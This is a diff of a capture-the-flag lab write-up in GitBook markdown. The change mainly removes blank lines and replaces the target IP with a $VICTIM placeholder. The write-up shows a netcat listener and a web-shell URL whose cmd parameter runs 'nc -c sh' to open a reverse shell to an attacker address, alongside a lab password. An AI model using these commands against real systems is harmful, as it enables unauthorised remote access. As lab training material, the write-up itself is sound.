@@ -42,10 +42,6 @@ Had to all the override to see the site on port 22 in firefox
 
 <figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
 <figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>
 
 
@@ -72,10 +68,6 @@ Password: u?WtKSraq
 
 
 
-
-
-
-
 <figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
@@ -89,7 +81,7 @@ If you run a command like this you can't see the results unless you view the sou
 **Browser**
 
 ```
-view-source:http://10.10.227.153:22/nnxhweOV/index.php?cmd=whoami
+view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=whoami
 ```
 
 <figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
@@ -105,7 +97,7 @@ nc -lvnp 1337
 **Browser**
 
 ```
-view-source:http://10.10.227.153:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
+view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
 ```
 
 <figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>
@@ -190,26 +182,3 @@ I just ended up using strings to read the root.txt
 ```
 
 <figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
